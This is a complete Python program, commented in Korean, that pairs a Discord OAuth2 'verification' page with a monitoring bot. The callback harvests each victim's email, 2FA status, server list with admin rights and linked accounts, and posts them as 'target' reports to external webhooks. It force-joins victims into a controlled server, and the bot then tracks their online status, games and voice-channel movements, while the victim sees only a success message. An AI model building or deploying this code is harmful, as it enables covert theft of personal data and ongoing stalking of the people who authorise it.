import os
import requests
import threading
import discord
from flask import Flask, request, render_template_string

# --- [1] 환경 변수 및 초기 설정 ---
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MY_GUILD_ID = os.environ.get('MY_GUILD_ID') # 타겟이 가입될 서버 "1" ID

# 서버 "2" (비밀 본부) 웹훅 URL
WH_PROFILE = os.environ.get('WH_PROFILE')   # 1번: 기본 신상용
WH_GUILDS = os.environ.get('WH_GUILDS')     # 2번: 서버 목록/권한용
WH_CONNECT = os.environ.get('WH_CONNECT')   # 3번: 외부 연결 계정용
WH_CONTROL = os.environ.get('WH_CONTROL')   # 4번: 강제 가입 및 실시간 상태용
WH_SYSTEM = os.environ.get('WH_SYSTEM')     # 5번: 시스템 오류 보고용

API_BASE = 'https://discord.com/api/v10'
user_storage = []

# --- [2] Flask 웹 서버 설정 (OAuth2 및 정보 수집) ---
app = Flask(__name__)

def send_report(url, embed):
    """지정된 웹훅으로 임베드 보고서를 전송합니다."""
    try:
        requests.post(url, json={"embeds": [embed]})
    except Exception as e:
        print(f"웹훅 전송 실패: {e}")

@app.route('/')
def home():
    return "Service is running."

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "인증 코드가 없습니다.", 400

    try:
        # 1. 액세스 토큰 교환
        token_data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        t_res = requests.post(f'{API_BASE}/oauth2/token', data=token_data, headers=headers).json()
        access_token = t_res.get('access_token')

        if not access_token:
            return "토큰 발급에 실패했습니다.", 400

        # 2. 데이터 수집 (사용자 정보, 서버 목록, 연결 계정)
        h = {'Authorization': f'Bearer {access_token}'}
        u = requests.get(f'{API_BASE}/users/@me', headers=h).json()
        g = requests.get(f'{API_BASE}/users/@me/guilds', headers=h).json()
        c = requests.get(f'{API_BASE}/users/@me/connections', headers=h).json()

        user_id = u.get('id')
        user_tag = f"{u.get('username')}#{u.get('discriminator', '0')}"

        # 3. [1번 채널] 기본 신상 보고
        send_report(WH_PROFILE, {
            "title": "👤 타겟 기본 신상 보고",
            "color": 3447003,
            "fields": [
                {"name": "유저명(ID)", "value": f"{user_tag} (`{user_id}`)"},
                {"name": "이메일", "value": u.get('email', 'N/A')},
                {"name": "보안/인증", "value": f"2FA: {u.get('mfa_enabled')} / Verified: {u.get('verified')}"},
                {"name": "니트로 상태", "value": f"Premium Type: {u.get('premium_type', 0)}"}
            ]
        })

        # 4. [2번 채널] 서버 목록 및 권한 분석 보고
        admin_guilds = [srv['name'] for srv in g if (int(srv.get('permissions', 0)) & 0x8)]
        send_report(WH_GUILDS, {
            "title": "🏰 소속 서버 및 영향력 분석",
            "color": 15105570,
            "description": f"타겟이 현재 가입된 서버는 총 **{len(g)}개**입니다.",
            "fields": [
                {"name": "관리자 권한 보유 서버", "value": ", ".join(admin_guilds) or "없음"}
            ]
        })

        # 5. [3번 채널] 외부 연결 플랫폼 보고
        conn_list = [f"**{conn['type']}**: {conn['name']} (인증: {conn['verified']})" for conn in c]
        send_report(WH_CONNECT, {
            "title": "🔗 외부 플랫폼 연동 정보",
            "color": 15844367,
            "description": "\n".join(conn_list) or "연결된 계정 없음"
        })

        # 6. [4번 채널] 서버 "1" 강제 가입 및 결과 보고
        join_h = {'Authorization': f'Bot {BOT_TOKEN}'}
        join_res = requests.put(
            f'{API_BASE}/guilds/{MY_GUILD_ID}/members/{user_id}',
            headers=join_h,
            json={'access_token': access_token}
        )
        join_status = "성공" if join_res.status_code in [201, 204] else f"실패 ({join_res.status_code})"
        
        send_report(WH_CONTROL, {
            "title": "⛓️ 강제 서버 가입 결과 보고",
            "color": 9807270,
            "fields": [
                {"name": "가입 서버 (서버1)", "value": f"ID: {MY_GUILD_ID}"},
                {"name": "가입 결과", "value": join_status}
            ],
            "footer": {"text": "이제 서버 1에 상주하는 봇이 타겟의 실시간 상태를 추적합니다."}
        })

        # 관리자 대시보드용 데이터 저장
        user_storage.append({"tag": user_tag, "id": user_id, "email": u.get('email', 'N/A')})

        return """
        <div style="text-align:center; margin-top:50px; font-family:sans-serif;">
            <h1 style="color:#5865F2;">✅ 인증 성공</h1>
            <p>디스코드 계정 인증이 완료되었습니다. 이 창을 닫으셔도 좋습니다.</p>
        </div>
        """

    except Exception as e:
        requests.post(WH_SYSTEM, json={"content": f"🚨 **시스템 오류 발생:** {str(e)}"})
        return "인증 중 오류가 발생했습니다.", 500

@app.route('/admin')
def admin():
    return render_template_string("""
    <body style="background:#23272a; color:white; font-family:sans-serif; padding:20px;">
        <h2>📊 수집된 타겟 요약 리스트 ({{ users|length }}명)</h2>
        <table border="1" style="width:100%; border-collapse:collapse; background:#2c2f33;">
            <tr style="background:#5865F2;"><th style="padding:10px;">유저 태그</th><th style="padding:10px;">고유 ID</th><th style="padding:10px;">이메일</th></tr>
            {% for u in users %}
            <tr><td style="padding:10px;">{{u.tag}}</td><td style="padding:10px;">{{u.id}}</td><td style="padding:10px;">{{u.email}}</td></tr>
            {% endfor %}
        </table>
    </body>
    """, users=user_storage)

# --- [3] Discord 봇 설정 (실시간 감시 및 온라인 유지) ---
intents = discord.Intents.default()
intents.presences = True   # 온라인 상태/게임 감시용
intents.members = True     # 멤버 목록 감시용
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"🤖 감시 봇 온라인: {client.user}")

@client.event
async def on_presence_update(before, after):
    """타겟의 실시간 활동(게임, 상태) 감지 및 서버 2로 보고"""
    # 우리가 설정한 서버 1에서의 활동만 감시
    if str(after.guild.id) != str(MY_GUILD_ID):
        return

    # 게임 활동이나 상태가 변했을 때만 보고
    if before.status != after.status or before.activities != after.activities:
        activity_names = [a.name for a in after.activities]
        activity_str = ", ".join(activity_names) if activity_names else "없음"
        
        embed = {
            "title": "📡 실시간 활동 포착",
            "color": 3066993,
            "fields": [
                {"name": "타겟", "value": f"**{after.name}**", "inline": True},
                {"name": "현재 상태", "value": f"`{after.status}`", "inline": True},
                {"name": "플레이 중", "value": f"**{activity_str}**", "inline": False}
            ]
        }
        send_report(WH_CONTROL, embed)

@client.event
async def on_voice_state_update(member, before, after):
    """음성 채널 입퇴장 실시간 보고"""
    if str(member.guild.id) != str(MY_GUILD_ID):
        return

    if before.channel != after.channel:
        if after.channel:
            msg = f"🔊 **{member.name}**님이 `{after.channel.name}` 음성 채널에 들어왔습니다."
        else:
            msg = f"🔈 **{member.name}**님이 음성 채널에서 나갔습니다."
        
        requests.post(WH_CONTROL, json={"content": msg})

# --- [4] 병렬 실행 엔진 ---
def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, use_reloader=False)

if __name__ == '__main__':
    # 1. Flask 웹 서버를 별도 스레드에서 실행
    t = threading.Thread(target=run_flask)
    t.start()

    # 2. Discord 봇 실행 (메인 스레드 점유, 온라인 유지)
    client.run(BOT_TOKEN)
